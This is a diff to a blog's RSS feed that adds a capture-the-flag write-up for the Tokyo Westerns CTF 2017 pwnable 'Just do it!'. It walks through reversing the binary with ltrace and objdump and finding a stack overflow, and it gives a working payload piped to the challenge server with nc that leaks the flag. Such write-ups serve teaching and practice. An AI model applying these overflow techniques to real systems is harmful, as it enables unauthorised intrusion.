@@ -620,6 +620,112 @@ flag&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;0r5t7hvR4dfTyhj67yKLO&lt;span 
 			</item>
 		
 			<item>
+				<title>[Write-Up] Tokyo Westerns CTF 3rd 2017 - Just do it!</title>
+				<description>&lt;h1 id=&quot;just-do-it-pwnable&quot;&gt;Just do it! (Pwnable)&lt;/h1&gt;
+
+&lt;p&gt;This challenge was not very hard. I started by retrieving informations of the binary.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mv just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa just_do_it
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lh&lt;/span&gt; just_do_it 
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 quentin quentin 7,7K sept.  4 10:04 just_do_it
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file just_do_it 
+just_do_it: ELF 32-bit LSB executable, Intel 80386, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib/ld-linux.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.32, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;cf72d1d758e59a5b9912e0e83c3af92175c6f629, not stripped
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./checksec.sh/checksec &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; just_do_it 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		2	just_do_it
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From the protection field, only the NX bit is enable, not stripped, dynamically linked and the size is 7,7K.
+I then did some tests to see how the binary works. But at the first try I get an error “file open error. : No such file or directory”. After a check with ltrace, the binary try to open a file “flag.txt” and exit if it can’t.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;toto&amp;gt;flag.txt
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./just_do_it 
+Welcome my secret service. Do you know the password?
+Input the password.
+toto
+Invalid Password, Try Again!
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ltrace ./just_do_it 
+__libc_start_main&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x80485bb, 1, 0xffbfb964, 0x8048710 &amp;lt;unfinished ...&amp;gt;
+setvbuf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xf76ee5a0, 0, 2, 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
+setvbuf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xf76eed60, 0, 2, 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
+setvbuf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xf76eecc0, 0, 2, 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
+fopen&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;flag.txt&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x9524008
+fgets&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;toto&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;, 48, 0x9524008&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                              &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x804a080
+puts&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Welcome my secret service. Do yo&quot;&lt;/span&gt;...Welcome my secret service. Do you know the password?
+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 53
+puts&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Input the password.&quot;&lt;/span&gt;Input the password.
+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 20
+fgets&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;toto
+&lt;span class=&quot;s2&quot;&gt;&quot;toto&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;, 32, 0xf76ee5a0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                             &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xffbfb898
+strcmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;toto&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;P@SSW0RD&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
+puts&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Invalid Password, Try Again!&quot;&lt;/span&gt;Invalid Password, Try Again!
+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                        &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 29
++++ exited &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;status 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; +++
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./just_do_it 
+Welcome my secret service. Do you know the password?
+Input the password.
+P@SSW0RD
+Invalid Password, Try Again!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After some test, the binary ask for a password. I found it (P@SSW0RD) thanks to ltrace but this is not enough to pass this step.&lt;/p&gt;
+
+&lt;p&gt;I then check the assembly code and I realized that it did not interest to pass the password request because it only change the output of the program.&lt;/p&gt;
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;objdump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intel&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;just_do_it&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+ &lt;span class=&quot;mi&quot;&gt;80486&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;75&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;                	&lt;span class=&quot;k&quot;&gt;jne&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;80486&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x136&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+ &lt;span class=&quot;mi&quot;&gt;80486&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a0&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;       	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x804a034&lt;/span&gt;
+ &lt;span class=&quot;mi&quot;&gt;80486&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ee&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f4&lt;/span&gt;             	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;
+ &lt;span class=&quot;mi&quot;&gt;80486&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;83&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;             	&lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc&lt;/span&gt;
+ &lt;span class=&quot;mi&quot;&gt;80486&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;75&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f4&lt;/span&gt;             	&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+ &lt;span class=&quot;mi&quot;&gt;80486&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;e8&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt;       	&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mi&quot;&gt;8048460&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So I test an easy overflow on the password input.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot;*20'&lt;/span&gt;|./just_do_it 
+Welcome my secret service. Do you know the password?
+Input the password.
+Segmentation fault &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;core dumped&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A segfault with only 20 bytes? While the “fgets” function can read 32 bytes? (cf: ltrace on top) After some check with GDB, I found that the segfault occurs when the “put” function is executed because the overflow overwrite the address of the strings “Invalid Password, Try Again!” in the stack. So we can print every strings present in the binary thanks to that bug. After some others GDB test, I found a padding of 20 bytes before rewrite the address of the strings.&lt;/p&gt;
+
+&lt;p&gt;The first step done by the binary is:&lt;/p&gt;
+
+&lt;p&gt;- Open the file “flag.txt”&lt;/p&gt;
+
+&lt;p&gt;- Read it content and store it at an address of the data segment.&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;objdump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intel&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;just_do_it&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+ &lt;span class=&quot;mi&quot;&gt;8048648&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;83&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;             	&lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;
+ &lt;span class=&quot;mi&quot;&gt;804864&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;75&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f0&lt;/span&gt;             	&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+ &lt;span class=&quot;mi&quot;&gt;804864&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;                	&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;
+ &lt;span class=&quot;mi&quot;&gt;8048650&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;68&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a0&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;       	&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x804a080&lt;/span&gt;
+ &lt;span class=&quot;mi&quot;&gt;8048655&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;e8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt;       	&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mi&quot;&gt;8048440&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At the address “0x08048650” we can see the instructions “push   0x804a080” which represent the buffer address of the file content pushed on the stack. So we will use it to display the content of the file “flag.txt”.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot;*20+&quot;\x80\xa0\x04\x08&quot;'&lt;/span&gt;|nc pwn1.chal.ctf.westerns.tokyo 12345
+Welcome my secret service. Do you know the password?
+Input the password.
+TWCTF&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;pwnable_warmup_I_did_it!&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Done.&lt;/p&gt;
+</description>
+				<pubDate>Mon, 04 Sep 2017 00:00:00 +0100</pubDate>
+				<link>/write-up/2017/09/04/just_do_it.html</link>
+				<guid isPermaLink="true">/write-up/2017/09/04/just_do_it.html</guid>
+			</item>
+		
+			<item>
 				<title>Basic Shellcode</title>
 				<description>&lt;h1 id=&quot;1-surroundings&quot;&gt;1. Surroundings&lt;/h1&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;uname &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
